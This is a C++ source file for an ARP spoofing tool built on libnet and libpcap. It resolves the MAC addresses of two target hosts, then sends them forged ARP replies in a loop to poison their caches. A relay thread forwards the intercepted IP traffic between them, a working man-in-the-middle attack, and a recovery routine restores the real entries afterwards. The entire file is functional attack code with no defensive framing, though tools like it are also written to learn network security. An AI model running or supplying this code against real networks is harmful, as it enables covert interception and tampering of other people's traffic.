#include "arpspoofing.h"
#include <stdio.h>
#include <iostream>
#include <libnet.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <thread>
using namespace std;

ARPSpoofing::ARPSpoofing() {}

bool ARPSpoofing::Init(char *s_ip_str, char *r_ip_str) {
    this->device = pcap_lookupdev(NULL);
    cout << ">> Capturing from " << this->device << endl;

    // init attacker ip, mac address
    libnet_t *l = libnet_init(LIBNET_LINK, this->device, NULL);
    memcpy(this->a_mac, libnet_get_hwaddr(l), MAC_ADDR_LEN);
    u_int32_t temp = libnet_get_ipaddr4(l);
    memcpy(this->a_ip, (u_int8_t*) &temp, IPv4_ADDR_LEN);
    libnet_destroy(l);
    cout << "done init attacker." << endl;

    // init sender, receiver ip parse
    ARPSpoofing::_char_bytes_to_uint8_bytes(s_ip_str, this->s_ip);
    ARPSpoofing::_char_bytes_to_uint8_bytes(r_ip_str, this->r_ip);
    cout << "done init sender, receiver ip parse." << endl;

    // init sender, receiver mac address
    ARPSpoofing::_get_mac_addr_through_arp_request(this->s_ip, this->s_mac);
    ARPSpoofing::_get_mac_addr_through_arp_request(this->r_ip, this->r_mac);
    cout << "done init sender, receiver mac." << endl;

    printf(">> Initialize Successed.\n");
    return true;
}

void ARPSpoofing::Attack() {

    std::thread([this] {
        ARPSpoofing::_relay();
    }).detach();

    std::thread([this] {
        while (this->exitFlag == false) {
            ARPSpoofing::_send_ARP_response(this->s_ip, this->s_mac, this->r_ip, NULL);
            ARPSpoofing::_send_ARP_response(this->r_ip, this->r_mac, this->s_ip, NULL);
            sleep(this->attack_cycle);
        }
        this->endAttack = true; // specify the attack is over
    }).detach();

    this->endAttack = false;
}

void ARPSpoofing::Stop() {
    this->exitFlag = true;
}

void ARPSpoofing::Recover() {
    while(this->endAttack == false); // waitng for finish Attack()
    ARPSpoofing::_send_ARP_response(this->s_ip, this->s_mac, this->r_ip, this->r_mac);
    ARPSpoofing::_send_ARP_response(this->r_ip, this->r_mac, this->s_ip, this->s_mac);
}

void ARPSpoofing::_get_mac_addr_through_arp_request(u_int8_t *t_ip, u_int8_t *t_mac) {
    ARPSpoofing::__read_packet([this, t_ip, t_mac] (pcap_t *handle, pcap_pkthdr header, const u_char *packet) {
        while (true) {
            ARPSpoofing::_send_ARP_request(t_ip);
            packet = pcap_next(handle, &header);
            libnet_ethernet_hdr *ethHeader = (libnet_ethernet_hdr*) packet;
            // if (ether_type == ETHERTYPE_ARP) and (ether_dhost == a_mac)
            if (ntohs(ethHeader->ether_type) == ETHERTYPE_ARP && ARPSpoofing::_bytes_equal(ethHeader->ether_dhost, this->a_mac, MAC_ADDR_LEN)) {
                _libnet_arp_hdr *arpHeader = (_libnet_arp_hdr*) (packet + sizeof(libnet_ethernet_hdr));
                // if (arp operation == ARPOP_REPLY) and (source ip == t_ip) and (target ip == a_ip)
                if (ntohs(arpHeader->ar_op) == ARPOP_REPLY &&
                        ARPSpoofing::_bytes_equal(arpHeader->ar_spa, t_ip, IPv4_ADDR_LEN) &&
                        ARPSpoofing::_bytes_equal(arpHeader->ar_tpa, this->a_ip, IPv4_ADDR_LEN)) {
                    memcpy(t_mac, ethHeader->ether_shost, MAC_ADDR_LEN);
                    pcap_close(handle);
                    ARPSpoofing::_bytes_print(t_ip, IPv4_ADDR_LEN);
                    ARPSpoofing::_bytes_print(t_mac, MAC_ADDR_LEN);
                    return;
                }
            }
        }
    });
}

void ARPSpoofing::_relay() {
    ARPSpoofing::__read_packet([this] (pcap_t *handle, pcap_pkthdr header, const u_char *packet) {
        while (this->exitFlag == false) {
            packet = pcap_next(handle, &header);
            libnet_ethernet_hdr *ethHeader = (libnet_ethernet_hdr*) packet;
            // if (ether_type == ETHERTYPE_IP)
            if (ntohs(ethHeader->ether_type) == ETHERTYPE_IP) {
                // if (ether_dhost == a_mac)
                if (ARPSpoofing::_bytes_equal(ethHeader->ether_dhost, this->a_mac, MAC_ADDR_LEN)) {
                    // if (ether_shost == s_mac)
                    if (ARPSpoofing::_bytes_equal(ethHeader->ether_shost, this->s_mac, MAC_ADDR_LEN)) {
                        memcpy(ethHeader->ether_shost, this->a_mac, MAC_ADDR_LEN);
                        memcpy(ethHeader->ether_dhost, this->r_mac, MAC_ADDR_LEN);
                        pcap_sendpacket(handle, packet, header.len);
                        cout << "OUT " << endl;
                    }
                    // if (ether_shost == r_mac)
                    else if (ARPSpoofing::_bytes_equal(ethHeader->ether_shost, this->r_mac, MAC_ADDR_LEN)) {
                        memcpy(ethHeader->ether_shost, this->a_mac, MAC_ADDR_LEN);
                        memcpy(ethHeader->ether_dhost, this->s_mac, MAC_ADDR_LEN);
                        pcap_sendpacket(handle, packet, header.len);
                        cout << "IN " << endl;
                    }
                }

            }
        }
        pcap_close(handle);
    });
}

void ARPSpoofing::__read_packet(std::function<void(pcap_t *handle, pcap_pkthdr header, const u_char *packet)> cb) {
    pcap_t *handle;                 /* Session handle */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */

    /* Open the session in promiscuous mode */
    handle = pcap_open_live(this->device, BUFSIZ, 1, 0, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", this->device, errbuf);
        return;
    }

    pcap_pkthdr header;
    const u_char *packet;

    cb(handle, header, packet); // send ARP Request
}

void ARPSpoofing::_send_ARP_request(u_int8_t *d_ip) {
    if(ARPSpoofing::__send_ARP(d_ip, NULL, NULL, NULL, ARPOP_REQUEST)) {
        cout << "arp request sended to " << ARPSpoofing::_uint8_bytes_to_char_bytes(d_ip) << endl;
    }
}

void ARPSpoofing::_send_ARP_response(u_int8_t *d_ip, uint8_t *d_mac, u_int8_t *s_ip, uint8_t *s_mac) {
    if (ARPSpoofing::__send_ARP(d_ip, d_mac, s_ip, s_mac, ARPOP_REPLY)) {
        cout << "arp response sended to " << ARPSpoofing::_uint8_bytes_to_char_bytes(d_ip) << endl;
    }
}

bool ARPSpoofing::__send_ARP(u_int8_t *d_ip, uint8_t *d_mac, u_int8_t *s_ip, uint8_t *s_mac, u_int16_t arp_type) {
    libnet_ethernet_hdr eth;
    memcpy(eth.ether_dhost, d_mac ? d_mac : this->broadcast, MAC_ADDR_LEN);
    memcpy(eth.ether_shost, s_mac ? s_mac : this->a_mac, MAC_ADDR_LEN);
    eth.ether_type = ntohs(ETHERTYPE_ARP);

    _libnet_arp_hdr arp;
    arp.ar_hrd = ntohs(ARPHRD_ETHER);   // Ethernet
    arp.ar_pro = ntohs(2048);           // IPv4
    arp.ar_hln = 6;                     // for Ethernet/IEEE 802
    arp.ar_pln = 4;                     // for IPv4
    arp.ar_op = ntohs(arp_type);
    memcpy(arp.ar_sha, s_mac ? s_mac : this->a_mac, MAC_ADDR_LEN);
    memcpy(arp.ar_spa, s_ip ? s_ip : this->a_ip, IPv4_ADDR_LEN);
    memcpy(arp.ar_tha, d_mac ? d_mac : this->zerofill, MAC_ADDR_LEN);
    memcpy(arp.ar_tpa, d_ip, IPv4_ADDR_LEN);

    int packet_length = sizeof(eth) + sizeof(arp);
    u_int8_t *packet = (u_int8_t*) malloc(packet_length);
    memcpy(packet, &eth, sizeof(eth));
    memcpy(packet + sizeof(eth), &arp, sizeof(arp));

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(this->device, BUFSIZ, 1, 0, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", this->device, errbuf);
        return false;
    }

    pcap_sendpacket(handle, packet, packet_length);
    pcap_close(handle);
    return true;
}

bool ARPSpoofing::_bytes_equal(u_int8_t *bytes_a, u_int8_t *bytes_b, int size) {
    for (int i = 0; i < size; i++) {
        if (bytes_a[i] != bytes_b[i]) {
            return false;
        }
    }
    return true;
}

void ARPSpoofing::_bytes_print(u_int8_t *bytes_array, int size) {
    for (int i = 1; i <= size; i++) {
        printf("%02x ", bytes_array[i-1]);
        if (i != 0 && i % 16 == 0) {
            printf("\n");
        } else if (i != 0 && i % 8 == 0) {
            printf(" ");
        }
    }
    printf("\n");
}

void ARPSpoofing::_char_bytes_to_uint8_bytes(char *char_array, u_int8_t *bytes_array) {
    inet_pton(AF_INET, char_array, bytes_array);
}

char* ARPSpoofing::_uint8_bytes_to_char_bytes(u_int8_t *bytes_array) {
    return inet_ntoa(*(in_addr*) bytes_array);
}

u_int8_t* ARPSpoofing::_reverse_byte_order(u_int8_t *bytes_array, int size) {
    for (int i = 0; i < size; i+=2) {
        *((u_int16_t*) &bytes_array[i]) = ntohs(*((u_int16_t*) &bytes_array[i]));
    }
    return bytes_array;
}
